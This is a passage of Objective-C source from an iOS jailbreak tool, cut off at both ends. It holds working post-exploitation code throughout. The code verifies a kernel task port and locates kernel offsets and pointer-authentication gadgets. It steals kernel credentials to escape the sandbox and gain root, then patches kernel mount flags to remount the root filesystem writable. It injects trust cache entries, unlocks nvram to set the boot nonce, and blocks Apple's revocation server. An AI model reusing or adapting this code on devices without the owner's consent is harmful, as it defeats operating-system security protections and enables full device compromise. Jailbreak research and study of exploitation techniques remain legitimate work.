                    NOTICE(NSLocalizedString(@"No exploit selected.", nil), false, false);
                    STATUS(NSLocalizedString(@"Jailbreak", nil), true, true);
                    return;
                    break;
                }
            }
        }
        if (kernel_slide == -1 && kernel_base != -1) kernel_slide = (kernel_base - KERNEL_SEARCH_ADDRESS);
        LOG("tfp0: 0x%x", tfp0);
        LOG("kernel_base: " ADDR, kernel_base);
        LOG("kernel_slide: " ADDR, kernel_slide);
        if (exploit_success && !verify_tfp0()) {
            LOG("Failed to verify TFP0.");
            exploit_success = false;
        }
        if (exploit_success && ReadKernel32(kernel_base) != MACH_HEADER_MAGIC) {
            LOG("Failed to verify kernel_base.");
            exploit_success = false;
        }
        if (!exploit_success) {
            NOTICE(NSLocalizedString(@"Failed to exploit kernel_task. This is not an error. Reboot and try again.", nil), true, false);
            exit(EXIT_FAILURE);
        }
        INSERTSTATUS(NSLocalizedString(@"Exploited kernel_task.\n", nil));
        LOG("Successfully exploited kernel_task.");
    }
    
    UPSTAGE();
    
    {
        if (!found_offsets) {
            // Initialize patchfinder64.
            
            LOG("Initializing patchfinder64...");
            SETMESSAGE(NSLocalizedString(@"Failed to initialize patchfinder64.", nil));
            const char *original_kernel_cache_path = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";
            const char *decompressed_kernel_cache_path = [homeDirectory stringByAppendingPathComponent:@"Documents/kernelcache.dec"].UTF8String;
            if (!canRead(decompressed_kernel_cache_path)) {
                FILE *original_kernel_cache = fopen(original_kernel_cache_path, "rb");
                _assert(original_kernel_cache != NULL, message, true);
                FILE *decompressed_kernel_cache = fopen(decompressed_kernel_cache_path, "w+b");
                _assert(decompressed_kernel_cache != NULL, message, true);
                _assert(decompress_kernel(original_kernel_cache, decompressed_kernel_cache, NULL, true) == ERR_SUCCESS, message, true);
                fclose(decompressed_kernel_cache);
                fclose(original_kernel_cache);
            }
            struct utsname u = { 0 };
            _assert(uname(&u) == ERR_SUCCESS, message, true);
            if (init_kernel(NULL, 0, decompressed_kernel_cache_path) != ERR_SUCCESS ||
                find_strref(u.version, 1, string_base_const, true, false) == 0) {
                _assert(clean_file(decompressed_kernel_cache_path), message, true);
                _assert(false, message, true);
            }
            LOG("Successfully initialized patchfinder64.");
        } else {
            auth_ptrs = GETOFFSET(auth_ptrs);
            monolithic_kernel = GETOFFSET(monolithic_kernel);
        }
        if (auth_ptrs) {
            SETOFFSET(auth_ptrs, true);
            LOG("Detected authentication pointers.");
            pmap_load_trust_cache = _pmap_load_trust_cache;
            prefs.ssh_only = true;
        }
        if (monolithic_kernel) {
            SETOFFSET(monolithic_kernel, true);
            LOG("Detected monolithic kernel.");
        }
        offset_options = GETOFFSET(unrestrict-options);
        if (!offset_options) {
            offset_options = kmem_alloc(sizeof(uint64_t));
            wk64(offset_options, 0);
            SETOFFSET(unrestrict-options, offset_options);
        }
    }
    
    UPSTAGE();
    
    if (!found_offsets) {
        // Find offsets.
        
        LOG("Finding offsets...");
        SETOFFSET(kernel_base, kernel_base);
        SETOFFSET(kernel_slide, kernel_slide);
        
#define PF(x) do { \
        SETMESSAGE(NSLocalizedString(@"Failed to find " #x " offset.", nil)); \
        if (!ISADDR(GETOFFSET(x))) SETOFFSET(x, find_symbol("_" #x)); \
        if (!ISADDR(GETOFFSET(x))) SETOFFSET(x, find_ ##x()); \
        LOG(#x " = " ADDR " + " ADDR, GETOFFSET(x), kernel_slide); \
        _assert(ISADDR(GETOFFSET(x)), message, true); \
        SETOFFSET(x, GETOFFSET(x) + kernel_slide); \
} while (false)
        PF(trustcache);
        PF(OSBoolean_True);
        PF(osunserializexml);
        PF(smalloc);
        if (!auth_ptrs) {
            PF(add_x0_x0_0x40_ret);
        }
        PF(zone_map_ref);
        PF(vfs_context_current);
        PF(vnode_lookup);
        PF(vnode_put);
        PF(kernel_task);
        PF(shenanigans);
        PF(lck_mtx_lock);
        PF(lck_mtx_unlock);
        if (kCFCoreFoundationVersionNumber >= 1535.12) {
            PF(vnode_get_snapshot);
            PF(fs_lookup_snapshot_metadata_by_name_and_return_name);
            PF(apfs_jhash_getvnode);
        }
        if (auth_ptrs) {
            PF(pmap_load_trust_cache);
            PF(paciza_pointer__l2tp_domain_module_start);
            PF(paciza_pointer__l2tp_domain_module_stop);
            PF(l2tp_domain_inited);
            PF(sysctl__net_ppp_l2tp);
            PF(sysctl_unregister_oid);
            PF(mov_x0_x4__br_x5);
            PF(mov_x9_x0__br_x1);
            PF(mov_x10_x3__br_x6);
            PF(kernel_forge_pacia_gadget);
            PF(kernel_forge_pacda_gadget);
            PF(IOUserClient__vtable);
            PF(IORegistryEntry__getRegistryEntryID);
        }
#undef PF
        found_offsets = true;
        LOG("Successfully found offsets.");
        
        // Deinitialize patchfinder64.
        term_kernel();
    }
    
    UPSTAGE();
    
    {
        // Initialize jailbreak.
        static uint64_t ShenanigansPatch = 0xca13feba37be;
        
        LOG("Initializing jailbreak...");
        SETMESSAGE(NSLocalizedString(@"Failed to initialize jailbreak.", nil));
        LOG("Escaping sandbox...");
        myProcAddr = get_proc_struct_for_pid(myPid);
        LOG("myProcAddr = " ADDR, myProcAddr);
        _assert(ISADDR(myProcAddr), message, true);
        kernelCredAddr = get_kernel_cred_addr();
        LOG("kernelCredAddr = " ADDR, kernelCredAddr);
        _assert(ISADDR(kernelCredAddr), message, true);
        Shenanigans = ReadKernel64(GETOFFSET(shenanigans));
        LOG("Shenanigans = " ADDR, Shenanigans);
        _assert(ISADDR(Shenanigans) || Shenanigans == ShenanigansPatch, message, true);
        if (Shenanigans != kernelCredAddr) {
            LOG("Detected corrupted shenanigans pointer.");
            Shenanigans = kernelCredAddr;
        }
        WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
        myCredAddr = kernelCredAddr;
        myOriginalCredAddr = give_creds_to_process_at_addr(myProcAddr, myCredAddr);
        LOG("myOriginalCredAddr = " ADDR, myOriginalCredAddr);
        _assert(ISADDR(myOriginalCredAddr), message, true);
        _assert(setuid(0) == ERR_SUCCESS, message, true);
        _assert(getuid() == 0, message, true);
        myHost = mach_host_self();
        _assert(MACH_PORT_VALID(myHost), message, true);
        LOG("Successfully escaped sandbox.");
        LOG("Setting HSP4 as TFP0...");
        remap_tfp0_set_hsp4(&tfp0);
        LOG("Successfully set HSP4 as TFP0.");
        INSERTSTATUS(NSLocalizedString(@"Set HSP4 as TFP0.", nil));
        LOG("Initializing kexecute...");
        _assert(init_kexecute(), message, true);
        LOG("Successfully initialized kexecute.");
        LOG("Platformizing...");
        set_platform_binary(myProcAddr, true);
        set_cs_platform_binary(myProcAddr, true);
        LOG("Successfully initialized jailbreak.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.export_kernel_task_port) {
            // Export kernel task port.
            LOG("Exporting kernel task port...");
            SETMESSAGE(NSLocalizedString(@"Failed to export kernel task port.", nil));
            export_tfp0(myOriginalHost);
            LOG("Successfully exported kernel task port.");
            INSERTSTATUS(NSLocalizedString(@"Exported kernel task port.\n", nil));
        } else {
            // Unexport kernel task port.
            LOG("Unexporting kernel task port...");
            SETMESSAGE(NSLocalizedString(@"Failed to unexport kernel task port.", nil));
            unexport_tfp0(myOriginalHost);
            LOG("Successfully unexported kernel task port.");
            INSERTSTATUS(NSLocalizedString(@"Unexported kernel task port.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        // Write a test file to UserFS.
        
        LOG("Writing a test file to UserFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to write a test file to UserFS.", nil));
        const char *testFile = [NSString stringWithFormat:@"/var/mobile/test-%lu.txt", time(NULL)].UTF8String;
        writeTestFile(testFile);
        LOG("Successfully wrote a test file to UserFS.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.dump_apticket) {
            NSString *originalFile = @"/System/Library/Caches/apticket.der";
            NSString *dumpFile = [homeDirectory stringByAppendingPathComponent:@"Documents/apticket.der"];
            if (![sha1sum(originalFile) isEqualToString:sha1sum(dumpFile)]) {
                // Dump APTicket.
                
                LOG("Dumping APTicket...");
                SETMESSAGE(NSLocalizedString(@"Failed to dump APTicket.", nil));
                NSData *fileData = [NSData dataWithContentsOfFile:originalFile];
                _assert(([fileData writeToFile:dumpFile atomically:YES]), message, true);
                LOG("Successfully dumped APTicket.");
            }
            INSERTSTATUS(NSLocalizedString(@"Dumped APTicket.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.overwrite_boot_nonce) {
            // Unlock nvram.
            
            LOG("Unlocking nvram...");
            SETMESSAGE(NSLocalizedString(@"Failed to unlock nvram.", nil));
            _assert(unlocknvram() == ERR_SUCCESS, message, true);
            LOG("Successfully unlocked nvram.");
            
            _assert(runCommand("/usr/sbin/nvram", "-p", NULL) == ERR_SUCCESS, message, true);
            const char *bootNonceKey = "com.apple.System.boot-nonce";
            if (runCommand("/usr/sbin/nvram", bootNonceKey, NULL) != ERR_SUCCESS ||
                strstr(lastSystemOutput.bytes, prefs.boot_nonce) == NULL) {
                // Set boot-nonce.
                
                LOG("Setting boot-nonce...");
                SETMESSAGE(NSLocalizedString(@"Failed to set boot-nonce.", nil));
                _assert(runCommand("/usr/sbin/nvram", [NSString stringWithFormat:@"%s=%s", bootNonceKey, prefs.boot_nonce].UTF8String, NULL) == ERR_SUCCESS, message, true);
                _assert(runCommand("/usr/sbin/nvram", [NSString stringWithFormat:@"%s=%s", kIONVRAMForceSyncNowPropertyKey, bootNonceKey].UTF8String, NULL) == ERR_SUCCESS, message, true);
                LOG("Successfully set boot-nonce.");
            }
            _assert(runCommand("/usr/sbin/nvram", "-p", NULL) == ERR_SUCCESS, message, true);
            
            // Lock nvram.
            
            LOG("Locking nvram...");
            SETMESSAGE(NSLocalizedString(@"Failed to lock nvram.", nil));
            _assert(locknvram() == ERR_SUCCESS, message, true);
            LOG("Successfully locked nvram.");
            
            INSERTSTATUS(NSLocalizedString(@"Overwrote boot nonce.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        // Log slide.
        
        LOG("Logging slide...");
        SETMESSAGE(NSLocalizedString(@"Failed to log slide.", nil));
        NSString *file = @(SLIDE_FILE);
        NSData *fileData = [[NSString stringWithFormat:@(ADDR "\n"), kernel_slide] dataUsingEncoding:NSUTF8StringEncoding];
        if (![[NSData dataWithContentsOfFile:file] isEqual:fileData]) {
            _assert(clean_file(file.UTF8String), message, true);
            _assert(create_file_data(file.UTF8String, 0, 0644, fileData), message, true);
        }
        LOG("Successfully logged slide.");
        INSERTSTATUS(NSLocalizedString(@"Logged slide.\n", nil));
    }
    
    UPSTAGE();
    
    {
        // Log ECID.
        
        LOG("Logging ECID...");
        SETMESSAGE(NSLocalizedString(@"Failed to log ECID.", nil));
        CFStringRef value = MGCopyAnswer(kMGUniqueChipID);
        if (value != nil) {
            _assert(modifyPlist(prefsFile, ^(id plist) {
                plist[K_ECID] = CFBridgingRelease(value);
            }), message, true);
        } else {
            LOG("I couldn't get the ECID... Am I running on a real device?");
        }
        LOG("Successfully logged ECID.");
        INSERTSTATUS(NSLocalizedString(@"Logged ECID.\n", nil));
    }
    
    UPSTAGE();
    
    {
        NSArray <NSString *> *array = @[@"/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate",
                                        @"/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation",
                                        @"/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate",
                                        @"/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation"];
        if (prefs.disable_auto_updates) {
            // Disable Auto Updates.
            
            LOG("Disabling Auto Updates...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable auto updates.", nil));
            for (NSString *path in array) {
                ensure_symlink("/dev/null", path.UTF8String);
            }
            _assert(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.Preferences.plist", ^(id plist) {
                plist[@"kBadgedForSoftwareUpdateKey"] = @NO;
                plist[@"kBadgedForSoftwareUpdateJumpOnceKey"] = @NO;
            }), message, true);
            LOG("Successfully disabled Auto Updates.");
            INSERTSTATUS(NSLocalizedString(@"Disabled Auto Updates.\n", nil));
        } else {
            // Enable Auto Updates.
            
            LOG("Enabling Auto Updates...");
            SETMESSAGE(NSLocalizedString(@"Failed to enable auto updates.", nil));
            for (NSString *path in array) {
                ensure_directory(path.UTF8String, 0, 0755);
            }
            _assert(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.Preferences.plist", ^(id plist) {
                plist[@"kBadgedForSoftwareUpdateKey"] = @YES;
                plist[@"kBadgedForSoftwareUpdateJumpOnceKey"] = @YES;;
            }), message, true);
            INSERTSTATUS(NSLocalizedString(@"Enabled Auto Updates.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        // Remount RootFS.
        
        LOG("Remounting RootFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to remount RootFS.", nil));
        int rootfd = open("/", O_RDONLY);
        _assert(rootfd > 0, message, true);
        const char **snapshots = snapshot_list(rootfd);
        char *systemSnapshot = copySystemSnapshot();
        _assert(systemSnapshot != NULL, message, true);
        const char *original_snapshot = "orig-fs";
        bool has_original_snapshot = false;
        const char *thedisk = "/dev/disk0s1s1";
        const char *oldest_snapshot = NULL;
        _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, message, true);
        if (snapshots == NULL) {
            close(rootfd);
            
            // Clear dev vnode's si_flags.
            
            LOG("Clearing dev vnode's si_flags...");
            SETMESSAGE(NSLocalizedString(@"Failed to clear dev vnode's si_flags.", nil));
            uint64_t devVnode = vnodeForPath(thedisk);
            LOG("devVnode = " ADDR, devVnode);
            _assert(ISADDR(devVnode), message, true);
            uint64_t v_specinfo = ReadKernel64(devVnode + koffset(KSTRUCT_OFFSET_VNODE_VU_SPECINFO));
            LOG("v_specinfo = " ADDR, v_specinfo);
            _assert(ISADDR(v_specinfo), message, true);
            WriteKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS), 0);
            _assert(_vnode_put(devVnode) == ERR_SUCCESS, message, true);
            LOG("Successfully cleared dev vnode's si_flags.");
            
            // Mount RootFS.
            
            LOG("Mounting RootFS...");
            SETMESSAGE(NSLocalizedString(@"Unable to mount RootFS.", nil));
            NSString *invalidRootMessage = NSLocalizedString(@"RootFS already mounted, delete OTA file from Settings - Storage if present and reboot.", nil);
            _assert(!is_mountpoint("/var/MobileSoftwareUpdate/mnt1"), invalidRootMessage, true);
            const char *rootFsMountPoint = "/private/var/tmp/jb/mnt1";
            if (is_mountpoint(rootFsMountPoint)) {
                _assert(unmount(rootFsMountPoint, MNT_FORCE) == ERR_SUCCESS, message, true);
            }
            _assert(clean_file(rootFsMountPoint), message, true);
            _assert(ensure_directory(rootFsMountPoint, 0, 0755), message, true);
            const char *argv[] = {"/sbin/mount_apfs", thedisk, rootFsMountPoint, NULL};
            _assert(runCommandv(argv[0], 3, argv, ^(pid_t pid) {
                uint64_t procStructAddr = get_proc_struct_for_pid(pid);
                LOG("procStructAddr = " ADDR, procStructAddr);
                _assert(ISADDR(procStructAddr), message, true);
                give_creds_to_process_at_addr(procStructAddr, kernelCredAddr);
            }) == ERR_SUCCESS, message, true);
            _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, message, true);
            const char *systemSnapshotLaunchdPath = [@(rootFsMountPoint) stringByAppendingPathComponent:@"sbin/launchd"].UTF8String;
            _assert(waitForFile(systemSnapshotLaunchdPath) == ERR_SUCCESS, message, true);
            LOG("Successfully mounted RootFS.");
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot...");
            SETMESSAGE(NSLocalizedString(@"Unable to rename system snapshot. Delete OTA file from Settings - Storage if present and reboot.", nil));
            rootfd = open(rootFsMountPoint, O_RDONLY);
            _assert(rootfd > 0, message, true);
            snapshots = snapshot_list(rootfd);
            _assert(snapshots != NULL, message, true);
            LOG("Snapshots on newly mounted RootFS:");
            for (const char **snapshot = snapshots; *snapshot; snapshot++) {
                LOG("\t%s", *snapshot);
            }
            free(snapshots);
            snapshots = NULL;
            NSString *systemVersionPlist = @"/System/Library/CoreServices/SystemVersion.plist";
            NSString *rootSystemVersionPlist = [@(rootFsMountPoint) stringByAppendingPathComponent:systemVersionPlist];
            _assert(rootSystemVersionPlist != nil, message, true);
            NSDictionary *snapshotSystemVersion = [NSDictionary dictionaryWithContentsOfFile:systemVersionPlist];
            _assert(snapshotSystemVersion != nil, message, true);
            NSDictionary *rootfsSystemVersion = [NSDictionary dictionaryWithContentsOfFile:rootSystemVersionPlist];
            _assert(rootfsSystemVersion != nil, message, true);
            if (![rootfsSystemVersion[@"ProductBuildVersion"] isEqualToString:snapshotSystemVersion[@"ProductBuildVersion"]]) {
                LOG("snapshot VersionPlist: %@", snapshotSystemVersion);
                LOG("rootfs VersionPlist: %@", rootfsSystemVersion);
                _assert("BuildVersions match"==NULL, invalidRootMessage, true);
            }
            const char *test_snapshot = "test-snapshot";
            _assert(fs_snapshot_create(rootfd, test_snapshot, 0) == ERR_SUCCESS, message, true);
            _assert(fs_snapshot_delete(rootfd, test_snapshot, 0) == ERR_SUCCESS, message, true);
            uint64_t system_snapshot_vnode = 0;
            uint64_t system_snapshot_vnode_v_data = 0;
            uint32_t system_snapshot_vnode_v_data_flag = 0;
            if (kCFCoreFoundationVersionNumber >= 1535.12) {
                system_snapshot_vnode = vnodeForSnapshot(rootfd, systemSnapshot);
                LOG("system_snapshot_vnode = " ADDR, system_snapshot_vnode);
                _assert(ISADDR(system_snapshot_vnode), message, true);
                system_snapshot_vnode_v_data = ReadKernel64(system_snapshot_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_DATA));
                LOG("system_snapshot_vnode_v_data = " ADDR, system_snapshot_vnode_v_data);
                _assert(ISADDR(system_snapshot_vnode_v_data), message, true);
                system_snapshot_vnode_v_data_flag = ReadKernel32(system_snapshot_vnode_v_data + 49);
                LOG("system_snapshot_vnode_v_data_flag = 0x%x", system_snapshot_vnode_v_data_flag);
                WriteKernel32(system_snapshot_vnode_v_data + 49, system_snapshot_vnode_v_data_flag & ~0x40);
            }
            _assert(fs_snapshot_rename(rootfd, systemSnapshot, original_snapshot, 0) == ERR_SUCCESS, message, true);
            if (kCFCoreFoundationVersionNumber >= 1535.12) {
                WriteKernel32(system_snapshot_vnode_v_data + 49, system_snapshot_vnode_v_data_flag);
                _assert(_vnode_put(system_snapshot_vnode) == ERR_SUCCESS, message, true);
            }
            LOG("Successfully renamed system snapshot.");
            
            // Reboot.
            close(rootfd);
            
            LOG("Rebooting...");
            SETMESSAGE(NSLocalizedString(@"Failed to reboot.", nil));
            NOTICE(NSLocalizedString(@"The system snapshot has been successfully renamed. The device will now be restarted.", nil), true, false);
            _assert(reboot(RB_QUICK) == ERR_SUCCESS, message, true);
            LOG("Successfully rebooted.");
        } else {
            LOG("APFS Snapshots:");
            for (const char **snapshot = snapshots; *snapshot; snapshot++) {
                if (oldest_snapshot == NULL) {
                    oldest_snapshot = *snapshot;
                }
                if (strcmp(original_snapshot, *snapshot) == 0) {
                    has_original_snapshot = true;
                }
                LOG("%s", *snapshot);
            }
        }
        
        _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, message, true);
        uint64_t rootfs_vnode = vnodeForPath("/");
        LOG("rootfs_vnode = " ADDR, rootfs_vnode);
        _assert(ISADDR(rootfs_vnode), message, true);
        uint64_t v_mount = ReadKernel64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
        LOG("v_mount = " ADDR, v_mount);
        _assert(ISADDR(v_mount), message, true);
        uint32_t v_flag = ReadKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG));
        if ((v_flag & MNT_RDONLY) || (v_flag & MNT_NOSUID)) {
            v_flag &= ~(MNT_RDONLY | MNT_NOSUID);
            WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag & ~MNT_ROOTFS);
            _assert(runCommand("/sbin/mount", "-u", thedisk, NULL) == ERR_SUCCESS, message, true);
            WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag);
        }
        _assert(_vnode_put(rootfs_vnode) == ERR_SUCCESS, message, true);
        _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, message, true);
        NSString *file = [NSString stringWithContentsOfFile:@"/.installed_unc0ver" encoding:NSUTF8StringEncoding error:nil];
        needStrap = (file == nil ||
                     (![file isEqualToString:@""] &&
                      ![file isEqualToString:[NSString stringWithFormat:@"%f\n", kCFCoreFoundationVersionNumber]]))
        && access("/electra", F_OK) != ERR_SUCCESS;
        if (needStrap)
            LOG("We need strap.");
        if (!has_original_snapshot) {
            if (oldest_snapshot != NULL) {
                _assert(fs_snapshot_rename(rootfd, oldest_snapshot, original_snapshot, 0) == ERR_SUCCESS, message, true);
            } else if (needStrap) {
                _assert(fs_snapshot_create(rootfd, original_snapshot, 0) == ERR_SUCCESS, message, true);
            }
        }
        free(systemSnapshot);
        systemSnapshot = NULL;
        free(snapshots);
        snapshots = NULL;
        close(rootfd);
        LOG("Successfully remounted RootFS.");
        INSERTSTATUS(NSLocalizedString(@"Remounted RootFS.\n", nil));
    }
    
    UPSTAGE();
    
    {
        // Write a test file to RootFS.
        
        LOG("Writing a test file to RootFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to write a test file to RootFS.", nil));
        const char *testFile = [NSString stringWithFormat:@"/test-%lu.txt", time(NULL)].UTF8String;
        writeTestFile(testFile);
        LOG("Successfully wrote a test file to RootFS.");
    }
    
    UPSTAGE();
    
    {
        NSArray <NSString *> *array = @[@"/var/Keychains/ocspcache.sqlite3",
                                        @"/var/Keychains/ocspcache.sqlite3-shm",
                                        @"/var/Keychains/ocspcache.sqlite3-wal"];
        if (prefs.disable_app_revokes && kCFCoreFoundationVersionNumber < 1535.12) {
            // Disable app revokes.
            LOG("Disabling app revokes...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable app revokes.", nil));
            blockDomainWithName("ocsp.apple.com");
            for (NSString *path in array) {
                ensure_symlink("/dev/null", path.UTF8String);
            }
            LOG("Successfully disabled app revokes.");
            INSERTSTATUS(NSLocalizedString(@"Disabled App Revokes.\n", nil));
        } else {
            // Enable app revokes.
            LOG("Enabling app revokes...");
            SETMESSAGE(NSLocalizedString(@"Failed to enable app revokes.", nil));
            unblockDomainWithName("ocsp.apple.com");
            for (NSString *path in array) {
                if (is_symlink(path.UTF8String)) {
                    clean_file(path.UTF8String);
                }
            }
            LOG("Successfully enabled app revokes.");
            INSERTSTATUS(NSLocalizedString(@"Enabled App Revokes.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        // Create jailbreak directory.
        
        LOG("Creating jailbreak directory...");
        SETMESSAGE(NSLocalizedString(@"Failed to create jailbreak directory.", nil));
        _assert(ensure_directory("/jb", 0, 0755), message, true);
        _assert(chdir("/jb") == ERR_SUCCESS, message, true);
        LOG("Successfully created jailbreak directory.");
        INSERTSTATUS(NSLocalizedString(@"Created jailbreak directory.\n", nil));
    }
    
    UPSTAGE();
    
    {
        NSString *offsetsFile = @"/jb/offsets.plist";
        NSMutableDictionary *dictionary = [NSMutableDictionary new];
#define CACHEADDR(value, name) do { \
dictionary[@(name)] = ADDRSTRING(value); \
} while (false)
#define CACHEOFFSET(offset, name) CACHEADDR(GETOFFSET(offset), name)
        CACHEADDR(kernel_base, "KernelBase");
        CACHEADDR(kernel_slide, "KernelSlide");
        CACHEOFFSET(trustcache, "TrustChain");
        CACHEADDR(ReadKernel64(GETOFFSET(OSBoolean_True)), "OSBooleanTrue");
        CACHEADDR(ReadKernel64(GETOFFSET(OSBoolean_True)) + sizeof(void *), "OSBooleanFalse");
        CACHEOFFSET(osunserializexml, "OSUnserializeXML");
        CACHEOFFSET(smalloc, "Smalloc");
        CACHEOFFSET(add_x0_x0_0x40_ret, "AddRetGadget");
        CACHEOFFSET(zone_map_ref, "ZoneMapOffset");
        CACHEOFFSET(vfs_context_current, "VfsContextCurrent");
        CACHEOFFSET(vnode_lookup, "VnodeLookup");
        CACHEOFFSET(vnode_put, "VnodePut");
        CACHEOFFSET(kernel_task, "KernelTask");
        CACHEOFFSET(shenanigans, "Shenanigans");
        CACHEOFFSET(lck_mtx_lock, "LckMtxLock");
        CACHEOFFSET(lck_mtx_unlock, "LckMtxUnlock");
        CACHEOFFSET(vnode_get_snapshot, "VnodeGetSnapshot");
        CACHEOFFSET(fs_lookup_snapshot_metadata_by_name_and_return_name, "FsLookupSnapshotMetadataByNameAndReturnName");
        CACHEOFFSET(pmap_load_trust_cache, "PmapLoadTrustCache");
        CACHEOFFSET(apfs_jhash_getvnode, "APFSJhashGetVnode");
        CACHEOFFSET(paciza_pointer__l2tp_domain_module_start, "PacizaPointerL2TPDomainModuleStart");
        CACHEOFFSET(paciza_pointer__l2tp_domain_module_stop, "PacizaPointerL2TPDomainModuleStop");
        CACHEOFFSET(l2tp_domain_inited, "L2TPDomainInited");
        CACHEOFFSET(sysctl__net_ppp_l2tp, "SysctlNetPPPL2TP");
        CACHEOFFSET(sysctl_unregister_oid, "SysctlUnregisterOid");
        CACHEOFFSET(mov_x0_x4__br_x5, "MovX0X4BrX5");
        CACHEOFFSET(mov_x9_x0__br_x1, "MovX9X0BrX1");
        CACHEOFFSET(mov_x10_x3__br_x6, "MovX10X3BrX6");
        CACHEOFFSET(kernel_forge_pacia_gadget, "KernelForgePaciaGadget");
        CACHEOFFSET(kernel_forge_pacda_gadget, "KernelForgePacdaGadget");
        CACHEOFFSET(IOUserClient__vtable, "IOUserClientVtable");
        CACHEOFFSET(IORegistryEntry__getRegistryEntryID, "IORegistryEntryGetRegistryEntryID");
#undef CACHEOFFSET
#undef CACHEADDR
        if (![[NSMutableDictionary dictionaryWithContentsOfFile:offsetsFile] isEqual:dictionary]) {
            // Cache offsets.
            
            LOG("Caching offsets...");
            SETMESSAGE(NSLocalizedString(@"Failed to cache offsets.", nil));
            _assert(([dictionary writeToFile:offsetsFile atomically:YES]), message, true);
            _assert(init_file(offsetsFile.UTF8String, 0, 0644), message, true);
            LOG("Successfully cached offsets.");
            INSERTSTATUS(NSLocalizedString(@"Cached Offsets.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.restore_rootfs) {
            SETMESSAGE(NSLocalizedString(@"Failed to Restore RootFS.", nil));
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot back...");
            NOTICE(NSLocalizedString(@"Will restore RootFS. This may take a while. Don't exit the app and don't let the device lock.", nil), 1, 1);
            SETMESSAGE(NSLocalizedString(@"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", nil));
            int rootfd = open("/", O_RDONLY);
            _assert(rootfd > 0, message, true);
            const char **snapshots = snapshot_list(rootfd);
            _assert(snapshots != NULL, message, true);
            const char *snapshot = *snapshots;
            LOG("%s", snapshot);
            _assert(snapshot != NULL, message, true);
            if (kCFCoreFoundationVersionNumber < 1452.23) {
                const char *systemSnapshotMountPoint = "/private/var/tmp/jb/mnt2";
                if (is_mountpoint(systemSnapshotMountPoint)) {
                    _assert(unmount(systemSnapshotMountPoint, MNT_FORCE) == ERR_SUCCESS, message, true);
                }
                _assert(clean_file(systemSnapshotMountPoint), message, true);
                _assert(ensure_directory(systemSnapshotMountPoint, 0, 0755), message, true);
                _assert(fs_snapshot_mount(rootfd, systemSnapshotMountPoint, snapshot, 0) == ERR_SUCCESS, message, true);
                const char *systemSnapshotLaunchdPath = [@(systemSnapshotMountPoint) stringByAppendingPathComponent:@"sbin/launchd"].UTF8String;
                _assert(waitForFile(systemSnapshotLaunchdPath) == ERR_SUCCESS, message, true);
                _assert(extractDebsForPkg(@"rsync", nil, false), message, true);
                _assert(injectTrustCache(@[@"/usr/bin/rsync"], GETOFFSET(trustcache), pmap_load_trust_cache) == ERR_SUCCESS, message, true);
                _assert(runCommand("/usr/bin/rsync", "-vaxcH", "--progress", "--delete-after", "--exclude=/Developer", [@(systemSnapshotMountPoint) stringByAppendingPathComponent:@"."].UTF8String, "/", NULL) == 0, message, true);
                unmount(systemSnapshotMountPoint, MNT_FORCE);
            } else {
                char *systemSnapshot = copySystemSnapshot();
                _assert(systemSnapshot != NULL, message, true);
                _assert(fs_snapshot_rename(rootfd, snapshot, systemSnapshot, 0) == ERR_SUCCESS, message, true);
                free(systemSnapshot);
                systemSnapshot = NULL;
            }
            close(rootfd);
            free(snapshots);
            snapshots = NULL;
            LOG("Successfully renamed system snapshot back.");
            
            // Clean up.
            
            LOG("Cleaning up...");
            SETMESSAGE(NSLocalizedString(@"Failed to clean up.", nil));
            static const char *cleanUpFileList[] = {
                "/var/cache",
                "/var/lib",
                "/var/stash",
                "/var/db/stash",
                "/var/mobile/Library/Cydia",
                "/var/mobile/Library/Caches/com.saurik.Cydia",
                NULL
            };
            for (const char **file = cleanUpFileList; *file != NULL; file++) {
                clean_file(*file);
            }
            LOG("Successfully cleaned up.");
            
            // Disallow SpringBoard to show non-default system apps.
            
            LOG("Disallowing SpringBoard to show non-default system apps...");
            SETMESSAGE(NSLocalizedString(@"Failed to disallow SpringBoard to show non-default system apps.", nil));
            _assert(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.springboard.plist", ^(id plist) {
                plist[@"SBShowNonDefaultSystemApps"] = @NO;
            }), message, true);
            LOG("Successfully disallowed SpringBoard to show non-default system apps.");
            
            // Disable RootFS Restore.
            
            LOG("Disabling RootFS Restore...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable RootFS Restore.", nil));
            pid_t cfprefsd_pid = pidOfProcess("/usr/libexec/cfprefsd");
            if (cfprefsd_pid != 0) {
                kill(cfprefsd_pid, SIGSTOP);
            }
            _assert(modifyPlist(prefsFile, ^(id plist) {
